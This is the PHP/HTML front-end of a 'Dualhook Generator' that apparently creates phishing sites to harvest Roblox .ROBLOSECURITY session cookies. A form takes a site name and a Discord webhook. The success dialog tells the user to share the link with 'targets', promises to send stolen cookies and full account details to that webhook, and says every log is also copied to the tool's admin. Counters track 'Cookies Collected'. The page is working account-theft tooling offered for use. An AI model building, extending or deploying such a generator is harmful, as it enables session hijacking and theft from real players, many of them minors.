<?php
require_once '../config.php';
require_once '../functions.php';

$globalStats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dualhook Generator - Bypasserv3</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        :root {
            --font-sans: 'Outfit', sans-serif;
            --font-display: 'Space Grotesk', sans-serif;
        }
        
        body {
            font-family: var(--font-sans);
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: #f8fafc;
            min-height: 100vh;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .glass-effect {
            backdrop-filter: blur(10px) saturate(180%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
        }
        
        .animated-gradient-text {
            background: linear-gradient(90deg, #3b82f6 0%, #2563eb 25%, #1d4ed8 50%, #3b82f6 75%, #2563eb 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradientFlow 3s linear infinite;
        }
        
        @keyframes gradientFlow {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .icon-box {
            width: 80px;
            height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            border-radius: 20px;
            font-size: 36px;
            margin: 0 auto 20px;
        }

        .info-text {
            font-size: 0.75rem;
            color: rgba(255, 255, 255, 0.5);
            margin-top: 0.5rem;
        }

        .btn-generate {
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            transition: all 0.3s ease;
        }

        .btn-generate:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4);
        }

        .btn-generate:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
    </style>
</head>
<body>
    <div class="container mx-auto px-4 py-12 max-w-2xl">
        <!-- Header -->
        <div class="text-center mb-12">
            <div class="icon-box">
                🚀
            </div>
            <h1 class="text-4xl font-bold mb-3">
                <span class="animated-gradient-text">Dualhook Generator</span>
            </h1>
            <p class="text-white/70">Create your custom cookie collection site</p>
        </div>

        <!-- Form Card -->
        <div class="glass-effect rounded-3xl p-8 shadow-2xl">
            <form id="generatorForm" class="space-y-6">
                <!-- Directory Name -->
                <div class="mb-6">
                    <label class="flex items-center gap-2 text-sm font-medium text-white/90 mb-2">
                        <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M2 6a2 2 0 012-2h4l2 2h4a2 2 0 012 2v1H8a3 3 0 00-3 3v1.5a1.5 1.5 0 01-3 0V6z" clip-rule="evenodd"/>
                            <path d="M6 12a2 2 0 012-2h8a2 2 0 012 2v2a2 2 0 01-2 2H2h2a2 2 0 002-2v-2z"/>
                        </svg>
                        Site Name
                    </label>
                    <input 
                        type="text" 
                        id="directory" 
                        name="directory" 
                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all focus:border-blue-400 focus:ring-2 focus:ring-blue-400/20 outline-none"
                        placeholder="my-awesome-site"
                        pattern="[a-zA-Z0-9_-]{3,32}"
                        minlength="3"
                        maxlength="32"
                        required
                    >
                    <p class="info-text">3-32 characters: letters, numbers, hyphens, underscores only</p>
                </div>

                <!-- Discord Webhook URL -->
                <div class="mb-6">
                    <label class="flex items-center gap-2 text-sm font-medium text-white/90 mb-2">
                        <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                            <path d="M10 12a2 2 0 100-4 2 2 0 000 4z"/>
                            <path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd"/>
                        </svg>
                        Discord Webhook URL
                    </label>
                    <input 
                        type="url" 
                        id="webhook" 
                        name="webhook" 
                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all focus:border-blue-400 focus:ring-2 focus:ring-blue-400/20 outline-none"
                        placeholder="https://discord.com/api/webhooks/..."
                        required
                    >
                    <p class="info-text">Where cookies will be sent. Get this from Discord channel settings → Integrations → Webhooks</p>
                </div>

                <!-- Generate Button -->
                <button 
                    type="submit" 
                    class="w-full py-4 btn-generate text-white font-bold text-lg rounded-xl flex items-center justify-center gap-3"
                    id="generateBtn"
                >
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
                    </svg>
                    Generate Site
                </button>
            </form>

            <!-- Info Section -->
            <div class="mt-8 pt-6 border-t border-white/10 text-center">
                <p class="text-sm text-white/60">
                    Each site generates a unique URL where people can submit their Roblox cookies.
                    All logs are sent directly to your Discord webhook!
                </p>
            </div>

            <!-- Back Link -->
            <div class="mt-6 text-center">
                <a href="/" class="text-blue-400 hover:text-blue-300 text-sm font-medium transition-colors inline-flex items-center gap-2">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
                    </svg>
                    Back to Main Site
                </a>
            </div>
        </div>

        <!-- Stats -->
        <div class="mt-8 grid grid-cols-3 gap-4">
            <div class="glass-effect rounded-2xl p-4 text-center">
                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalInstances']); ?></div>
                <div class="text-xs text-white/60 mt-1">Sites Created</div>
            </div>
            <div class="glass-effect rounded-2xl p-4 text-center">
                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalCookies']); ?></div>
                <div class="text-xs text-white/60 mt-1">Cookies Collected</div>
            </div>
            <div class="glass-effect rounded-2xl p-4 text-center">
                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalVisits']); ?></div>
                <div class="text-xs text-white/60 mt-1">Total Visits</div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('generatorForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const btn = document.getElementById('generateBtn');
            const originalHTML = btn.innerHTML;
            
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner mx-auto"></div>';
            
            const formData = {
                directory: document.getElementById('directory').value.trim(),
                webhook: document.getElementById('webhook').value.trim(),
            };
            
            try {
                const response = await fetch('create.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                
                const data = await response.json();
                
                if (data.success) {
                    Swal.fire({
                        icon: 'success',
                        title: 'Site Generated Successfully!',
                        html: `
                            <div class="text-left space-y-4">
                                <div>
                                    <p class="text-sm text-gray-600 mb-1">📁 Site Name</p>
                                    <p class="font-mono text-sm bg-gray-100 p-2 rounded">${data.directory}</p>
                                </div>
                                <div>
                                    <p class="text-sm text-gray-600 mb-1">🔗 Your Link</p>
                                    <a href="${data.instanceUrl}" target="_blank" class="font-mono text-sm text-blue-600 bg-gray-100 p-2 rounded block hover:bg-gray-200 break-all">${data.instanceUrl}</a>
                                </div>
                                <div class="bg-green-50 border border-green-200 rounded p-3 mt-4">
                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Account Info Fetching</p>
                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Robux Balance Display</p>
                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Premium Status Check</p>
                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Limited RAP Calculation</p>
                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Group Ownership Detection</p>
                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Game Visit Stats</p>
                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Rich Discord Embeds</p>
                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Cookie Refresh Bypass</p>
                                    <p class="text-sm font-medium text-green-800">✅ Master Admin Logging</p>
                                </div>
                                <div class="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
                                    <p class="text-sm font-medium text-blue-800 mb-2">📋 How It Works:</p>
                                    <p class="text-xs text-blue-700">1. Share your link with targets</p>
                                    <p class="text-xs text-blue-700">2. They submit their .ROBLOSECURITY cookie</p>
                                    <p class="text-xs text-blue-700">3. Cookie is automatically bypassed</p>
                                    <p class="text-xs text-blue-700">4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE via webhook</p>
                                    <p class="text-xs text-blue-700">5. Master log sent to admin</p>
                                </div>
                                <div class="bg-yellow-50 border border-yellow-200 rounded p-3 mt-4">
                                    <p class="text-xs font-medium text-yellow-800">💡 All logs will be sent to your Discord webhook. Save your link!</p>
                                </div>
                            </div>
                        `,
                        confirmButtonText: 'OK',
                        confirmButtonColor: '#3b82f6',
                        width: '600px'
                    });
                    
                    // Reset form
                    document.getElementById('generatorForm').reset();
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Generation Failed',
                        text: data.error || 'An error occurred',
                        confirmButtonColor: '#ef4444'
                    });
                }
            } catch (error) {
                Swal.fire({
                    icon: 'error',
                    title: 'Error',
                    text: 'Failed to connect to server',
                    confirmButtonColor: '#ef4444'
                });
            } finally {
                btn.disabled = false;
                btn.innerHTML = originalHTML;
            }
        });
    </script>
</body>
</html>
